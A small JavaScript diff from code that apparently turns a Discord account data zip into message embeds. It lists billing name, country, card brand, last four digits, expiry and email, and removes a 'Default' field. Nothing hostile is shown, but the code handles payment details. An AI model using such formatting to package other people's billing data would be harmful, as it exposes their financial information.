@@ -65,14 +65,12 @@ const json = async (zipFile) => {
   discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${billingType(billing.type)}`,
     fields: (billing.type === 1 ? [
-      ['✅ Default', billing.default],
       ['👨 Name', billing.billing_address.name],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
       ['🔚 Ends in', code(billing.last_4)],
       ['®️ Brand', billing.brand],
       ['⛔ Expires in', code(billing.expires_month + '/' + billing.expires_year)]
     ] : [
-      ['✅ Default', billing.default],
       ['👨 Name', billing.billing_address.name],
       ['✉️ Email', code(billing.email)],
       ['🏴 Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
